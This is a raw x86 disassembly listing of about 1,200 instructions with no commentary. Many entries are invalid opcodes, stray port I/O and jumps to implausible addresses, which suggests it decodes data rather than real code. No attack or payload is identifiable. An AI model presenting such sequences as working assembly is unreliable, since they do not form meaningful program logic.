  41b666:	repz or eax,0x4a54e774
  41b66c:	adc    eax,0x1a106591
  41b671:	int3   
  41b672:	(bad)  
  41b673:	or     eax,DWORD PTR [eax]
  41b675:	add    BYTE PTR [eax],al
  41b677:	add    BYTE PTR [eax],al
  41b679:	add    BYTE PTR [ebp+0x6b],dh
  41b67c:	fisttp DWORD PTR [edx]
  41b67e:	and    BYTE PTR [edi-0x2b],0x9
  41b682:	jne    0x41b66f
  41b684:	cmp    al,0x6f
  41b687:	loopne 0x41b60d
  41b689:	call   0x8042a1fd
  41b68e:	pop    ebx
  41b68f:	in     al,dx
  41b690:	or     DWORD PTR [ebp+0x7d],0xffffff98
  41b694:	or     DWORD PTR [ebp+0x71],0xffffff90
  41b698:	mov    al,al
  41b69a:	imul   ecx,DWORD PTR [ebx],0x6d825f20
  41b6a0:	dec    eax
  41b6a1:	or     DWORD PTR [ebp-0x15],esi
  41b6a4:	sbb    al,0x7a
  41b6a6:	jb     0x41b710
  41b6a8:	and    BYTE PTR [ecx],cl
  41b6aa:	jne    0x41b697
  41b6ac:	movsx  esi,BYTE PTR [esi]
  41b6af:	test   al,0x46
  41b6b1:	push   ss
  41b6b2:	jne    0x41b653
  41b6b4:	inc    esi
  41b6b5:	add    DWORD PTR [esp+ebp*2-0x27],esi
  41b6b9:	dec    ebp
  41b6ba:	fisub  DWORD PTR [ecx]
  41b6bc:	pop    eax
  41b6bd:	inc    eax
  41b6be:	div    BYTE PTR [ecx]
  41b6c0:	inc    esp
  41b6c1:	je     0x41b643
  41b6c3:	xchg   ecx,eax
  41b6c4:	push   esp
  41b6c5:	sub    al,0xf6
  41b6c7:	inc    ecx
  41b6c8:	add    al,0x74
  41b6ca:	xchg   esp,eax
  41b6cb:	mov    eax,ds:0x31f61854
  41b6d0:	add    eax,0xf917874
  41b6d5:	add    DWORD PTR [esp+eiz*8-0x5fcd0000],0xfffffff6
  41b6dd:	or     DWORD PTR [eax],eax
  41b6df:	add    BYTE PTR [eax],al
  41b6e1:	add    BYTE PTR [eax],al
  41b6e3:	push   ds
  41b6e4:	add    eax,esi
  41b6e6:	leave  
  41b6e7:	mov    al,0xf0
  41b6e9:	out    dx,eax
  41b6ea:	in     al,dx
  41b6eb:	stos   DWORD PTR es:[edi],eax
  41b6ec:	shr    BYTE PTR [ecx+edi*8-0x3646148c],0x38
  41b6f4:	lock out 0xec,eax
  41b6f7:	aas    
  41b6f8:	shl    BYTE PTR [ecx+edi*8-0x3652131e],0x30
  41b700:	lock jecxz 0x41b6ef
  41b703:	xchg   ebx,eax
  41b704:	shr    BYTE PTR [esi+esi*8],0x67
  41b708:	jmp    0x41b72b
  41b70a:	sbb    edx,0x47
  41b70d:	pop    ebx
  41b70e:	adc    ch,BYTE PTR ds:0x3d4c004e
  41b714:	dec    esi
  41b715:	out    0x4b,al
  41b717:	and    eax,esi
  41b719:	cs pop eax
  41b71b:	outs   dx,BYTE PTR ds:[esi]
  41b71c:	dec    edx
  41b71d:	out    0x88,al
  41b71f:	test   al,0xc
  41b721:	out    0x3,eax
  41b723:	mov    ebx,0x9c0efd40
  41b728:	mul    BYTE PTR [esi+eax*2-0x97e0095]
  41b72f:	mov    al,0x40
  41b731:	cmc    
  41b732:	cmc    
  41b733:	pop    ebp
  41b734:	repnz lods al,BYTE PTR ds:[esi]
  41b736:	inc    esi
  41b737:	xor    edx,0xffffff91
  41b73a:	or     bh,BYTE PTR [ebx]
  41b73c:	inc    eax
  41b73d:	fld    QWORD PTR [edx]
  41b73f:	dec    esp
  41b740:	(bad)  
  41b741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b742:	inc    esi
  41b743:	imul   eax,DWORD PTR [eax],0x2d
  41b746:	inc    esi
  41b747:	add    BYTE PTR [eax],al
  41b749:	add    BYTE PTR [eax],al
  41b74b:	add    BYTE PTR [edx-0xf],cl
  41b74e:	dec    edi
  41b74f:	pop    es
  41b750:	xlat   BYTE PTR ds:[ebx]
  41b752:	push   ebp
  41b753:	mov    BYTE PTR ds:0x7c7b6307,bl
  41b759:	add    ah,bh
  41b75b:	mov    DWORD PTR [eax-0x1c6a1210],edi
  41b761:	mov    bh,bh
  41b763:	in     al,dx
  41b764:	in     eax,dx
  41b765:	lds    ebp,FWORD PTR cs:[edx-0x36077d8a]
  41b76c:	lods   eax,DWORD PTR ds:[esi]
  41b76d:	xrelease mov DWORD PTR [edi+0x13b60577],esi
  41b774:	icebp  
  41b775:	sbb    al,BYTE PTR ds:0xc5ff4de9
  41b77b:	scas   eax,DWORD PTR es:[edi]
  41b77c:	jno    0x41b76f
  41b77e:	out    0xd2,al
  41b780:	jns    0x41b784
  41b782:	add    BYTE PTR [ebx-0x5d],ah
  41b785:	add    DWORD PTR ds:0x1c18af37,ecx
  41b78b:	out    dx,al
  41b78c:	jnp    0x41b80c
  41b78e:	sbb    ebp,eax
  41b790:	jbe    0x41b794
  41b792:	adc    al,0x6d
  41b795:	push   ebx
  41b796:	cs imul ecx,esp,0xf6f773d7
  41b79d:	fld    DWORD PTR [edi+0x34]
  41b7a0:	jo     0x41b762
  41b7a2:	inc    ebp
  41b7a3:	fbld   TBYTE PTR [edi+ebx*8+0x276e803]
  41b7aa:	and    BYTE PTR [ebx-0x4d7cfa8c],0x0
  41b7b1:	add    BYTE PTR [eax],al
  41b7b3:	add    BYTE PTR [eax],al
  41b7b5:	ins    BYTE PTR es:[edi],dx
  41b7b6:	add    al,BYTE PTR [eax]
  41b7b8:	imul   ebx,DWORD PTR [edi+0x34640d46],0x30e9000c
  41b7c2:	inc    eax
  41b7c3:	push   ss
  41b7c4:	icebp  
  41b7c5:	push   ecx
  41b7c6:	(bad)  
  41b7c8:	call   0xe4383a43
  41b7cd:	lods   eax,DWORD PTR ds:[esi]
  41b7ce:	and    BYTE PTR cs:[ebx+0x71],0x51
  41b7d3:	xor    al,0x69
  41b7d5:	pop    ds
  41b7d6:	inc    edi
  41b7d7:	jae    0x41b7b9
  41b7d9:	xor    BYTE PTR [eax+0x16],al
  41b7dc:	loop   0x41b7ff
  41b7de:	(bad)  
  41b7e1:	sbb    al,0x2
  41b7e3:	cmp    dl,0xd
  41b7e6:	cmp    ebx,DWORD PTR ds:0x714a6780
  41b7ec:	or     DWORD PTR [edx+0x3f],ebx
  41b7ef:	push   ss
  41b7f0:	adc    esp,DWORD PTR [ebp+0x77]
  41b7f3:	cld    
  41b7f4:	dec    DWORD PTR [edx+eax*4]
  41b7f7:	test   BYTE PTR [ecx],0xd9
  41b7fa:	pop    es
  41b7fb:	cmp    bl,0x31
  41b7fe:	cmp    eax,DWORD PTR ds:0x10d01ac6
  41b804:	jmp    0x41b950
  41b809:	dec    esp
  41b80a:	mov    ebx,0x33590efe
  41b80f:	or     al,BYTE PTR [eax]
  41b811:	fadd   QWORD PTR [ecx+0x7cd341f7]
  41b817:	or     al,BYTE PTR gs:[eax]
  41b81a:	add    BYTE PTR [eax],al
  41b81c:	add    BYTE PTR [eax],al
  41b81e:	int3   
  41b81f:	add    esi,eax
  41b821:	inc    esi
  41b822:	stos   BYTE PTR es:[edi],al
  41b823:	shl    ch,1
  41b825:	nop
  41b826:	pushf  
  41b827:	add    DWORD PTR [eax],eax
  41b829:	xor    BYTE PTR [ebp+0xc1871cc],0xb8
  41b830:	std    
  41b831:	push   cs
  41b832:	sbb    DWORD PTR [eax],edx
  41b834:	or     al,BYTE PTR [eax]
  41b836:	pushf  
  41b837:	xor    edi,0x457c9345
  41b83d:	or     cl,BYTE PTR [ecx+eax*1+0x76a46c6]
  41b844:	out    0x73,eax
  41b846:	fdivr  QWORD PTR [eax-0x7eb98b03]
  41b84c:	cmc    
  41b84d:	add    ebx,DWORD PTR [ecx+0x1c]
  41b850:	cmp    bl,0x6e
  41b853:	sub    eax,0xcf1ac606
  41b858:	or     bl,ch
  41b85a:	add    al,BYTE PTR [ecx-0x498aaa09]
  41b860:	add    al,dh
  41b862:	mov    ebx,0xc6e904cd
  41b867:	imul   edx,edi,0x3e
  41b86a:	jb     0x41b8ca
  41b86c:	cli    
  41b86d:	or     DWORD PTR [ebp-0x15],esi
  41b870:	ret    0x6b45
  41b873:	mov    bl,0xe7
  41b875:	inc    ebx
  41b876:	cmc    
  41b877:	and    BYTE PTR [edx],al
  41b879:	jae    0x41b8d0
  41b87b:	imul   ebx,ecx,0x3
  41b87e:	and    al,0x80
  41b881:	clc    
  41b882:	add    BYTE PTR [eax],al
  41b884:	add    BYTE PTR [eax],al
  41b886:	add    BYTE PTR [edi+0x6e],al
  41b889:	adc    eax,0xf9b533c6
  41b88e:	call   0xd1b2425
  41b893:	pusha  
  41b894:	rol    DWORD PTR [eax+0x264e26f8],0xc6
  41b89b:	xor    edx,ebp
  41b89d:	repz call 0x4192405
  41b8a3:	push   0x66
  41b8a5:	cmp    al,0x7
  41b8a7:	jne    0x41b894
  41b8a9:	xor    dh,0x79
  41b8ac:	int3   
  41b8ad:	test   DWORD PTR [ebp+0x6c],edx
  41b8b0:	jmp    0x41b8b2
  41b8b2:	sbb    BYTE PTR [esi+0x40830afa],0xe2
  41b8b9:	add    BYTE PTR [eax],al
  41b8bb:	mov    bl,0x24
  41b8bd:	test   BYTE PTR [edx],0x83
  41b8c0:	test   al,0x88
  41b8c2:	push   ebp
  41b8c3:	jbe    0x41b847
  41b8c5:	int3   
  41b8c6:	pop    es
  41b8c7:	jne    0x41b8b2
  41b8c9:	cmp    al,0x95
  41b8cc:	int3   
  41b8cd:	test   al,al
  41b8cf:	ins    DWORD PTR es:[edi],dx
  41b8d0:	jmp    0xc61b39d5
  41b8d5:	and    BYTE PTR [eax],al
  41b8d7:	enter  0x87e1,0x43
  41b8db:	xchg   ecx,eax
  41b8dc:	add    dh,bh
  41b8de:	mov    dh,BYTE PTR [esi-0x477bf8e2]
  41b8e4:	in     al,dx
  41b8e5:	jmp    0x41b93d
  41b8e7:	jns    0x41b8a5
  41b8e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8ea:	add    al,BYTE PTR [eax]
  41b8ec:	add    BYTE PTR [eax],al
  41b8ee:	add    BYTE PTR [eax],al
  41b8f0:	add    BYTE PTR [ebx],0x7d
  41b8f3:	inc    ebp
  41b8f4:	and    cl,BYTE PTR [edx-0x332114cf]
  41b8fa:	xor    eax,0xe83cfadc
  41b8ff:	pop    ds
  41b900:	or     al,BYTE PTR ds:0x27a776c
  41b906:	out    0x89,eax
  41b908:	mov    al,0xeb
  41b90a:	retf   0x7e8d
  41b90d:	add    al,0x0
  41b90f:	pop    esp
  41b910:	jb     0x41b914
  41b912:	out    0x83,eax
  41b914:	fisttp QWORD PTR [eax]
  41b916:	jae    0x41b904
  41b918:	pop    edx
  41b919:	xlat   BYTE PTR ds:[ebx]
  41b91a:	jecxz  0x41b973
  41b91c:	fild   WORD PTR [edx-0x22bedd0f]
  41b922:	ror    ecx,1
  41b924:	inc    edx
  41b925:	xlat   BYTE PTR ds:[ebx]
  41b926:	lock dec edi
  41b928:	gs adc cl,0x9
  41b92c:	sub    DWORD PTR [edi],eax
  41b92e:	fisttp WORD PTR [bp+si-0x7ab3]
  41b933:	ret    0x138
  41b936:	or     ch,bh
  41b938:	or     BYTE PTR [edi],0xa7
  41b93b:	(bad)  
  41b93c:	cli    
  41b93d:	cmp    al,0xd7
  41b93f:	ins    DWORD PTR es:[edi],dx
  41b940:	jb     0x41b97c
  41b942:	fild   QWORD PTR [bx+0x5c]
  41b946:	jo     0x41b98a
  41b948:	add    edi,DWORD PTR [si-0x3c]
  41b94c:	jbe    0x41b974
  41b94e:	pop    edi
  41b94f:	inc    edx
  41b950:	push   0xffffff88
  41b952:	sbb    ah,BYTE PTR [eax]
  41b954:	add    BYTE PTR [eax],al
  41b956:	add    BYTE PTR [eax],al
  41b958:	add    BYTE PTR [ebp-0xef46783],dl
  41b95e:	adc    eax,DWORD PTR [eax]
  41b960:	loope  0x41b9d8
  41b962:	add    cl,BYTE PTR [ecx-0x37fb512]
  41b968:	fisttp QWORD PTR [esi+0x41054389]
  41b96e:	sub    al,dl
  41b970:	mov    ecx,0x36fcc503
  41b975:	hlt    
  41b976:	xchg   edx,eax
  41b977:	jae    0x41b96c
  41b979:	lock cmp al,0x15
  41b97c:	add    eax,0x610206f3
  41b981:	mov    bh,0xed
  41b983:	mov    DWORD PTR [edi+0x717d1f07],esp
  41b989:	mov    ch,0x1e
  41b98b:	or     eax,0xf903f5ee
  41b990:	push   ss
  41b991:	into   
  41b992:	and    DWORD PTR [ebx-0x3b],0xece70296
  41b999:	outs   dx,BYTE PTR ds:[esi]
  41b99a:	add    al,BYTE PTR [eax]
  41b99c:	imul   edi,DWORD PTR [edx-0x5292f30e],0xf6e8fffd
  41b9a6:	fld    DWORD PTR [edi-0xa]
  41b9a9:	cmc    
  41b9aa:	cmp    BYTE PTR [eax],cl
  41b9ac:	jmp    0xe8877627
  41b9b1:	xchg   edx,eax
  41b9b2:	fucomi st,st(1)
  41b9b4:	out    0x76,al
  41b9b6:	add    al,BYTE PTR [eax-0x7cfaad3e]
  41b9bc:	mov    eax,ds:0x0
  41b9c1:	add    dl,al
  41b9c3:	aad    0xfc
  41b9c5:	scas   eax,DWORD PTR es:[edi]
  41b9c6:	xor    al,0xd3
  41b9c8:	and    eax,eax
  41b9ca:	into   
  41b9cb:	std    
  41b9cc:	(bad)  
  41b9cd:	call   0xee9593c8
  41b9d2:	cmc    
  41b9d3:	mov    esp,0xc84f96fb
  41b9d8:	inc    ebp
  41b9d9:	call   0x107a372
  41b9de:	push   ebx
  41b9df:	push   es
  41b9e0:	add    BYTE PTR [eax-0x7af4ea09],al
  41b9e6:	nop
  41b9e7:	mov    ecx,0x4412fffb
  41b9ec:	std    
  41b9ed:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41b9ef:	add    DWORD PTR [ebx],0xf7864c00
  41b9f5:	das    
  41b9f6:	sbb    eax,DWORD PTR [ebx-0x53440362]
  41b9fc:	ret    0xd46
  41b9ff:	push   ds
  41ba00:	in     eax,0xa2
  41ba02:	adc    eax,DWORD PTR [esi]
  41ba04:	add    BYTE PTR [ebp+0x838bcdf],cl
  41ba0a:	sub    eax,DWORD PTR [ebp-0x53a4046a]
  41ba10:	bound  ecx,QWORD PTR [edi]
  41ba12:	call   0x65f5:0x748362c8
  41ba19:	mov    DWORD PTR [edx],edx
  41ba1b:	(bad)  
  41ba1c:	ret    0xcd46
  41ba1f:	push   ds
  41ba20:	in     eax,0x82
  41ba22:	rol    DWORD PTR ds:0x8000,cl
  41ba28:	add    BYTE PTR [eax],al
  41ba2a:	add    bh,al
  41ba2c:	sbb    cl,BYTE PTR [ebx]
  41ba2e:	test   ecx,ebp
  41ba30:	mov    al,0xfb
  41ba32:	call   DWORD PTR [edx]
  41ba34:	inc    ebp
  41ba35:	std    
  41ba36:	sub    DWORD PTR [ebp-0x63fffcca],esp
  41ba3c:	mov    BYTE PTR [edi],bh
  41ba3e:	sar    BYTE PTR [eax-0x3],1
  41ba41:	or     al,BYTE PTR [edi-0x450bc]
  41ba47:	xor    bh,bl
  41ba49:	mov    ebp,0xe48742c3
  41ba4e:	xor    BYTE PTR [edx],dh
  41ba50:	jge    0x41ba94
  41ba52:	adc    dl,dl
  41ba54:	inc    esp
  41ba55:	std    
  41ba56:	sub    ah,ch
  41ba58:	push   ss
  41ba59:	add    eax,DWORD PTR [eax]
  41ba5b:	jne    0x41ba38
  41ba5d:	cmp    al,0x78
  41ba60:	test   BYTE PTR [eax],0xc6
  41ba63:	mov    ebx,0xb7e724da
  41ba68:	call   0x5436ba6d
  41ba6d:	push   cs
  41ba6e:	or     eax,0xfcd4bcf1
  41ba73:	inc    edx
  41ba74:	xor    ah,BYTE PTR [ebp-0x7]
  41ba77:	cmp    dh,BYTE PTR [eax]
  41ba79:	test   al,bh
  41ba7b:	jg     0x41ba65
  41ba7d:	jl     0x41ba92
  41ba7f:	sub    DWORD PTR [eax-0x29],eax
  41ba82:	mov    DWORD PTR [ebx+0x69941cb0],edi
  41ba88:	mov    bh,0xe9
  41ba8a:	adc    eax,0xc600db7d
  41ba8f:	add    BYTE PTR [eax],al
  41ba91:	add    BYTE PTR [eax],al
  41ba93:	add    BYTE PTR [ebx+0x6be70fda],dh
  41ba99:	loopne 0x41ba9b
  41ba9b:	add    BYTE PTR [edx+0x39],ch
  41ba9e:	ret    
  41ba9f:	mov    ebp,esi
  41baa1:	adc    ch,BYTE PTR [ebx+0x40]
  41baa4:	jne    0x41bb0d
  41baa6:	les    ecx,FWORD PTR [ecx+edi*8]
  41baa9:	pop    ecx
  41baaa:	(bad)  
  41baab:	push   DWORD PTR [ebp+0x5c]
  41baae:	pop    eax
  41baaf:	and    al,0x71
  41bab1:	fisttp DWORD PTR [ebp+0x8]
  41bab4:	(bad)  
  41bab5:	outs   dx,BYTE PTR ds:[esi]
  41bab6:	sbb    al,0x10
  41bab8:	in     al,dx
  41bab9:	push   ss
  41baba:	and    BYTE PTR [edx+ebp*2],bl
  41babd:	jno    0x41ba7f
  41babf:	sbb    BYTE PTR [ebp+0x7645c23b],0xdb
  41bac6:	mov    esi,0x4ff97445
  41bacb:	sub    al,0xf6
  41bacd:	mov    dl,0x5
  41bacf:	je     0x41bb44
  41bad1:	pop    esp
  41bad2:	jmp    0x48ecbbda
  41bad7:	or     eax,0x34501f8
  41badc:	jne    0x41bae0
  41bade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41badf:	inc    ecx
  41bae0:	ja     0x41badc
  41bae2:	jg     0x41baab
  41bae4:	jo     0x41bae8
  41bae6:	out    0xc1,eax
  41bae8:	mov    eax,0x35eaee04
  41baed:	or     edi,esp
  41baef:	add    edi,DWORD PTR [ebx]
  41baf1:	dec    ecx
  41baf2:	jmp    0xe4cf0ef5
  41baf7:	add    eax,DWORD PTR [eax]
  41baf9:	add    BYTE PTR [eax],al
  41bafb:	add    BYTE PTR [eax],al
  41bafd:	jne    0x41bac7
  41baff:	lods   al,BYTE PTR ds:[esi]
  41bb00:	add    eax,0x197db3a
  41bb05:	jne    0x41bb09
  41bb07:	out    0x91,al
  41bb09:	xor    eax,0x8dbb667d
  41bb0e:	inc    edx
  41bb0f:	out    0x7f,eax
  41bb11:	(bad)  
  41bb13:	bound  edx,QWORD PTR ds:0x8e6d012
  41bb19:	ret    
  41bb1a:	inc    eax
  41bb1b:	jmp    0xf20baf6a
  41bb20:	or     al,dh
  41bb22:	je     0x41bb08
  41bb24:	add    esi,DWORD PTR [ebp-0x31]
  41bb27:	retf   0xa886
  41bb2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb2c:	add    esp,ebx
  41bb2e:	dec    eax
  41bb2f:	jmp    0xd0c3:0x53ff4817
  41bb36:	mov    edx,0x30d205ca
  41bb3b:	jmp    0x2d123043
  41bb40:	add    edi,DWORD PTR [ecx+0x60]
  41bb43:	out    dx,al
  41bb44:	jo     0x41bb38
  41bb46:	rcr    BYTE PTR [esi+0x1bd97420],1
  41bb4c:	add    dh,BYTE PTR [ebp+0x2]
  41bb4f:	lds    edi,FWORD PTR [esi]
  41bb51:	je     0x41bb61
  41bb53:	dec    ebp
  41bb54:	push   eax
  41bb55:	or     DWORD PTR [esi],0x0
  41bb58:	cmp    eax,0xafbf7372
  41bb5d:	mov    cl,0x23
  41bb5f:	push   es
  41bb60:	nop
  41bb61:	add    BYTE PTR [eax],al
  41bb63:	add    BYTE PTR [eax],al
  41bb65:	add    BYTE PTR [ecx+0x4],bl
  41bb68:	add    cl,ch
  41bb6a:	xor    BYTE PTR [ebp+0x2],al
  41bb6d:	in     eax,dx
  41bb6e:	pop    ecx
  41bb6f:	cmp    al,BYTE PTR [esi]
  41bb71:	jmp    0xea878bec
  41bb76:	in     al,dx
  41bb77:	cmp    al,0x1
  41bb79:	imul   esi,DWORD PTR [eax],0x346e0cf9
  41bb7f:	iret   
  41bb80:	cld    
  41bb81:	jmp    0x24105401
  41bb86:	not    DWORD PTR [edx]
  41bb88:	js     0x41bb33
  41bb8a:	jbe    0x41bb89
  41bb8c:	sbb    BYTE PTR [edi+0x69000271],0x40
  41bb93:	or     BYTE PTR ds:0x8556c,cl
  41bb99:	jmp    0xe044006e
  41bb9e:	sbb    edx,ebp
  41bba0:	add    eax,0x45d076e9
  41bba5:	jmp    0xfed0:0x69013cec
  41bbac:	or     al,0x6e
  41bbae:	fs iret 
  41bbb0:	cld    
  41bbb1:	jmp    0xc4105431
  41bbb6:	hlt    
  41bbb7:	push   cs
  41bbb8:	js     0x41bb63
  41bbba:	jbe    0x41bbb9
  41bbbc:	sub    BYTE PTR [edi+0x71],0x2
  41bbc0:	add    BYTE PTR [ecx-0x60],ch
  41bbc3:	std    
  41bbc4:	call   0x1865c80
  41bbc9:	jae    0x41bbcb
  41bbcb:	add    BYTE PTR [eax],al
  41bbcd:	add    BYTE PTR [eax],al
  41bbcf:	cmp    BYTE PTR [ecx],al
  41bbd1:	adc    al,0x70
  41bbd4:	push   ebp
  41bbd5:	jbe    0x41bbb5
  41bbd7:	lock mov edi,0x1f0e0039
  41bbdd:	js     0x41bc1f
  41bbdf:	pushf  
  41bbe0:	xor    DWORD PTR [edi-0x80],esp
  41bbe3:	(bad)  
  41bbe6:	test   ebp,esp
  41bbe8:	add    DWORD PTR [eax],eax
  41bbea:	add    dl,cl
  41bbec:	or     al,0x2
  41bbee:	or     al,BYTE PTR ds:0x5c000192
  41bbf4:	mov    eax,0x47d60342
  41bbf9:	(bad)  
  41bbfa:	jg     0x41bbf1
  41bbfc:	(bad)  
  41bbfd:	jae    0x41bc4d
  41bbff:	arpl   WORD PTR [eax+0x2dde3acd],ax
  41bc05:	js     0x41bc47
  41bc07:	dec    esp
  41bc08:	xor    edi,DWORD PTR [edi]
  41bc0a:	adc    ch,0xd1
  41bc0d:	or     eax,DWORD PTR [ebp+0x30d]
  41bc13:	pop    edx
  41bc14:	lar    ecx,WORD PTR [ebx]
  41bc17:	mov    ch,0x99
  41bc19:	add    DWORD PTR [eax],eax
  41bc1b:	or     al,0xb8
  41bc1d:	inc    edx
  41bc1e:	add    eax,DWORD PTR [esi+0x457fff47]
  41bc24:	int3   
  41bc25:	jae    0x41bc4d
  41bc27:	and    eax,DWORD PTR [eax+0x298e3acd]
  41bc2d:	js     0x41bc6f
  41bc2f:	fdiv   QWORD PTR [edx]
  41bc31:	pop    ss
  41bc32:	add    BYTE PTR [eax],0x0
  41bc35:	add    BYTE PTR [eax],al
  41bc37:	add    BYTE PTR [ebp+0x55850bcf],al
  41bc3d:	add    al,BYTE PTR [eax]
  41bc3f:	add    BYTE PTR [edx+0x650c020f],cl
  41bc45:	add    DWORD PTR [ecx],0xf781dc00
  41bc4b:	and    BYTE PTR [ebx-0x33fa8bb3],ah
  41bc51:	add    esi,eax
  41bc53:	inc    esi
  41bc54:	sahf   
  41bc55:	add    ebp,esp
  41bc57:	outs   dx,BYTE PTR ds:[esi]
  41bc58:	jne    0x41bc38
  41bc5a:	add    BYTE PTR [eax],al
  41bc5c:	cmc    
  41bc5d:	mov    al,0x19
  41bc5f:	jae    0x41bc8d
  41bc61:	popf   
  41bc62:	cmp    eax,0x305063ff
  41bc67:	and    al,0x69
  41bc69:	pop    esi
  41bc6a:	mov    dl,0xc
  41bc6c:	stc    
  41bc6d:	repnz cld 
  41bc6f:	(bad)  
  41bc70:	jp     0x41bcc2
  41bc72:	push   ebx
  41bc73:	or     al,bh
  41bc75:	imul   ecx,DWORD PTR [edi+0x28],0xfffffffe
  41bc79:	push   ds
  41bc7a:	and    BYTE PTR [eax],dl
  41bc7c:	mov    ds,WORD PTR [ecx-0x7bd476cd]
  41bc82:	stos   BYTE PTR es:[edi],al
  41bc83:	xor    BYTE PTR ds:0xb38a06d7,0xac
  41bc8a:	sbb    al,0x81
  41bc8c:	jno    0x41bc66
  41bc8e:	mov    BYTE PTR [ebp+0x62],al
  41bc91:	push   ecx
  41bc92:	ds adc eax,0x4388ac59
  41bc98:	push   ecx
  41bc99:	in     al,0x3
  41bc9b:	add    DWORD PTR [eax],0x0
  41bc9e:	add    BYTE PTR [eax],al
  41bca0:	add    BYTE PTR [ecx+0x33],dl
  41bca3:	sar    esp,cl
  41bca5:	idiv   BYTE PTR [esi+0x32751c1c]
  41bcab:	and    al,0x3
  41bcad:	jne    0x41bc8a
  41bcaf:	cmp    al,0x70
  41bcb2:	xchg   esi,eax
  41bcb3:	cli    
  41bcb4:	lds    esi,FWORD PTR [ebx+0x25e90eda]
  41bcba:	pop    ebx
  41bcbb:	xlat   BYTE PTR ds:[ebx]
  41bcbc:	or     DWORD PTR [edx+0x5e],edi
  41bcbf:	mov    WORD PTR [edx],es
  41bcc1:	jne    0x41bc9e
  41bcc3:	mov    edx,0xe7b67445
  41bcc8:	sahf   
  41bcc9:	cmc    
  41bcca:	jmp    DWORD PTR [ebx]
  41bccc:	or     eax,0xfffcd5f1
  41bcd1:	ret    0xd75a
  41bcd4:	push   es
  41bcd5:	push   0x2
  41bcd7:	imul   ecx,edi,0x76
  41bcda:	add    ah,bh
  41bcdc:	adc    BYTE PTR [ebp-0x76dfd4f6],dh
  41bce2:	push   edi
  41bce3:	fisttp WORD PTR [eax-0x7528d9d2]
  41bce9:	ds sar DWORD PTR es:[ebp-0x7408fcd0],cl
  41bcf1:	cmp    BYTE PTR [ecx],al
  41bcf3:	fsubr  DWORD PTR [bx+0x57]
  41bcf7:	xor    al,0x5e
  41bcf9:	cmp    BYTE PTR [ebp-0x18],al
  41bcfc:	adc    DWORD PTR [ebp+0x9],esi
  41bcff:	sub    esp,DWORD PTR [eax]
  41bd01:	mov    ebx,edi
  41bd03:	(bad)  
  41bd04:	retf   
  41bd05:	add    BYTE PTR [eax],al
  41bd07:	add    BYTE PTR [eax],al
  41bd09:	add    BYTE PTR [esi+0x2],dh
  41bd0c:	out    0x88,eax
  41bd0e:	sar    esi,1
  41bd10:	rcr    ebx,0xc6
  41bd13:	push   ds
  41bd14:	bound  ebp,QWORD PTR [edi]
  41bd16:	cdq    
  41bd17:	mul    BYTE PTR [ecx+0x3f]
  41bd1a:	xchg   ecx,eax
  41bd1b:	repnz adc edx,eax
  41bd1e:	ret    0x2c77
  41bd21:	aam    0x41
  41bd23:	xchg   BYTE PTR [esi],ah
  41bd25:	dec    edi
  41bd26:	outs   dx,DWORD PTR ds:[esi]
  41bd27:	js     0x41bccd
  41bd29:	in     al,dx
  41bd2a:	push   esi
  41bd2b:	xchg   dl,dh
  41bd2d:	(bad)  
  41bd2e:	cli    
  41bd2f:	inc    esp
  41bd30:	(bad)  
  41bd31:	mov    DWORD PTR [eax-0x12aaf50d],esi
  41bd37:	inc    esi
  41bd38:	add    eax,DWORD PTR ds:0xcc7d8568
  41bd3e:	icebp  
  41bd3f:	retf   
  41bd40:	imul   ebx,DWORD PTR [edi-0x6f],0xedeae6f6
  41bd47:	push   es
  41bd48:	out    0x3,eax
  41bd4a:	cmc    
  41bd4b:	(bad)  
  41bd4c:	lock dec esi
  41bd4e:	jnp    0x41bd14
  41bd50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd51:	add    bl,BYTE PTR [esi+0x7946ffd7]
  41bd57:	xchg   esp,eax
  41bd58:	dec    ebp
  41bd59:	jmp    0x41bd47
  41bd5b:	ret    0x90b
  41bd5e:	cli    
  41bd5f:	in     al,0x6
  41bd61:	push   ebp
  41bd62:	xor    BYTE PTR [ebx+0x74],al
  41bd65:	or     BYTE PTR [eax+0x56],ah
  41bd68:	adc    DWORD PTR [eax],esp
  41bd6a:	scas   eax,DWORD PTR es:[edi]
  41bd6b:	inc    ebp
  41bd6c:	add    ch,cl
  41bd6e:	add    BYTE PTR [eax],al
  41bd70:	add    BYTE PTR [eax],al
  41bd72:	add    BYTE PTR [edi+0x7f],dh
  41bd75:	popa   
  41bd76:	in     eax,0x76
  41bd78:	add    al,BYTE PTR [eax+0x59e336e7]
  41bd7e:	in     eax,0x76
  41bd80:	add    bh,BYTE PTR [edx+ecx*1]
  41bd83:	jbe    0x41bdf4
  41bd85:	mov    edi,0xb1f299f
  41bd8a:	or     BYTE PTR [edx-0x7a46bf89],0x3
  41bd91:	or     eax,0xffff106e
  41bd96:	call   0x6b024a12
  41bd9b:	and    DWORD PTR [ebx],ebx
  41bd9d:	xchg   edi,eax
  41bd9e:	pusha  
  41bd9f:	scas   eax,DWORD PTR es:[edi]
  41bda0:	cli    
  41bda1:	xchg   BYTE PTR [edi-0x1ace1bce],bh
  41bda7:	jbe    0x41bdab
  41bda9:	cmp    al,0xc2
  41bdab:	mov    ebp,0x70a7c603
  41bdb0:	cld    
  41bdb1:	out    0xc,al
  41bdb3:	jge    0x41bdb7
  41bdb5:	add    ch,bh
  41bdb7:	xchg   ebx,eax
  41bdb8:	std    
  41bdb9:	xchg   edx,eax
  41bdba:	sub    DWORD PTR [edi],esp
  41bdbc:	ret    
  41bdbd:	and    ebx,esi
  41bdbf:	jle    0x41be06
  41bdc1:	add    dl,BYTE PTR [eax]
  41bdc3:	in     eax,dx
  41bdc4:	(bad)  
  41bdc5:	(bad)  
  41bdc6:	call   0xfd6604be
  41bdcb:	jbe    0x41bd91
  41bdcd:	inc    ebp
  41bdce:	call   0xc5bb53
  41bdd3:	loope  0x41bdd7
  41bdd5:	add    BYTE PTR [eax],al
  41bdd7:	add    BYTE PTR [eax],al
  41bdd9:	add    BYTE PTR [eax],al
  41bddb:	add    BYTE PTR [edi+0x2f],al
  41bdde:	or     al,0x85
  41bde0:	retf   
  41bde1:	lods   eax,DWORD PTR ds:[esi]
  41bde2:	xor    al,0xff
  41bde4:	retf   
